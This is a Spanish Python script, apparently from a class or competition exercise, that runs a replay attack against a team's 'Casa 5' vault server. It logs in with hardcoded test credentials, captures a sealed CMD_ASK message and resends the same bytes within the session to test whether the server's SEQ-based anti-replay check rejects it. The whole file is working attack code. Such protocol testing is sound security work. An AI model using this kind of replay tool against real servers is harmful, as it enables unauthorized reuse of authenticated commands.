"""
repetir.py - Ataque de repeticion (replay) contra la Boveda de la Casa 5.

Hace un login normal, manda un CMD_ASK valido y luego reenvia EXACTAMENTE los mismos
bytes (misma sesion, mismo SEQ). Si el servidor vuelve a procesar la copia, el
anti-repeticion por SEQ (seccion 9 del protocolo de ellos) no sirve.

Nota: el replay tiene sentido dentro de una misma sesion, porque la copia va cifrada con
las claves de esa sesion. En una conexion nueva las claves cambian y la copia ya no
verificaria.

Antes de correr: calibrar con recon.py y pegar el CONFIG en casa5.py.
Correr con `python repetir.py <IP> [puerto]`  (no `python -I`).
"""

import sys

import casa5
from casa5 import CONFIG

USUARIO = "ratonton"
CLAVE = "ratoncinado"


def correr(host, puerto):
    with casa5.ClienteCasa5(host, puerto) as c:
        c.handshake()
        tipo, _, _ = c.login(USUARIO, CLAVE)
        if tipo != casa5.LOGIN_OK:
            print(f"  no se pudo loguear ({casa5.nombre(tipo)}), no se puede probar el replay")
            return

        # Armamos un CMD_ASK valido a mano para quedarnos con los bytes exactos.
        cuerpo = {CONFIG.F_KEY: "", CONFIG.F_SEQ: c.seq, CONFIG.F_TOKEN: c.token}
        payload = c._sellar(casa5.CMD_ASK, cuerpo)

        c.enviar(casa5.CMD_ASK, payload)                 # envio legitimo
        t1, m1, d1 = c.recibir_cifrado()
        print(f"  envio original : {casa5.nombre(t1)}  mac_ok={m1}  datos={d1}")

        try:
            c.enviar(casa5.CMD_ASK, payload)             # la MISMA copia, byte por byte
            t2, m2, d2 = c.recibir_cifrado()
            print(f"  copia repetida : {casa5.nombre(t2)}  mac_ok={m2}  datos={d2}")
            if t2 == casa5.RET_OK:
                print("  >> VULNERABLE: el servidor reproceso la copia (no revisa el SEQ).")
            else:
                print(f"  >> PROTEGIDO: el servidor rechazo la copia ({casa5.nombre(t2)}).")
        except casa5.ErrorCasa5 as e:
            print(f"  copia repetida : la conexion se cerro ({e})")
            print("  >> PROTEGIDO: el servidor corto ante la copia.")


def main():
    if len(sys.argv) < 2:
        print("Uso: python repetir.py <IP> [puerto]")
        return
    host = sys.argv[1]
    puerto = int(sys.argv[2]) if len(sys.argv) > 2 else 6005
    print(f"=== Replay contra {host}:{puerto} (Casa 5) ===")
    correr(host, puerto)


if __name__ == "__main__":
    main()
